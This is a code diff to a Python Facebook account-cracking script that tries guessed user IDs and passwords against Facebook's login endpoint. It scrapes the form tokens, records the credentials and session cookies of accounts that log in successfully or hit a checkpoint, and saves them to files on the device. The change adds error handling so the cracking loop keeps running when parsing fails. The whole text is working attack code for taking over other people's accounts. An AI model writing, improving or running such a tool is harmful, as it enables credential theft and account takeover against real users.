@@ -205,34 +205,46 @@ def rcrack1(uid,pwx,tl):
             'viewport-width': '980',
         }
         
-        free_fb = session.get('https://free.facebook.com', cookies=cookies, headers=header_freefb).text
-        log_data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"
-        }
-        lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8', data=log_data, cookies=cookies, headers=header_freefb).text
-        log_cookies = session.cookies.get_dict().keys()
-        if 'c_user' in log_cookies:
-            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-            cid = coki[65:80]
-            print(f"\033[38;5;46m=[Noorsalan-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
-            open('/sdcard/Noorsalan-OK.txt', 'a').write( uid+' | '+ps+'\n')
-            oks.append(cid)
-        elif 'checkpoint' in log_cookies:
-            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-            cid = coki[82:97]
-            print(f"\x1b[38;5;196m=[Noorsalan-LK💔]= {uid}|{ps}")
-            open('/sdcard/Noorsalan-LK.txt', 'a').write( uid+' | '+ps+' \n')
-            cps.append(uid)
-        else:
-            continue
+        try:
+            free_fb = session.get('https://free.facebook.com', cookies=cookies, headers=header_freefb).text
+            
+            lsd_match = re.search('name="lsd" value="(.*?)"', str(free_fb))
+            jazoest_match = re.search('name="jazoest" value="(.*?)"', str(free_fb))
+            m_ts_match = re.search('name="m_ts" value="(.*?)"', str(free_fb))
+            li_match = re.search('name="li" value="(.*?)"', str(free_fb))
+            
+            log_data = {
+                "lsd": lsd_match.group(1) if lsd_match else "",
+                "jazoest": jazoest_match.group(1) if jazoest_match else "",
+                "m_ts": m_ts_match.group(1) if m_ts_match else "",
+                "li": li_match.group(1) if li_match else "",
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In"
+            }
+            
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8', data=log_data, cookies=cookies, headers=header_freefb).text
+            log_cookies = session.cookies.get_dict().keys()
+            
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f"\033[38;5;46m=[Noorsalan-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
+                open('/sdcard/Noorsalan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\x1b[38;5;196m=[Noorsalan-LK💔]= {uid}|{ps}")
+                open('/sdcard/Noorsalan-LK.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+            else:
+                continue
+        except Exception as e:
+            pass
+            
     loop+=1
 
 Main()
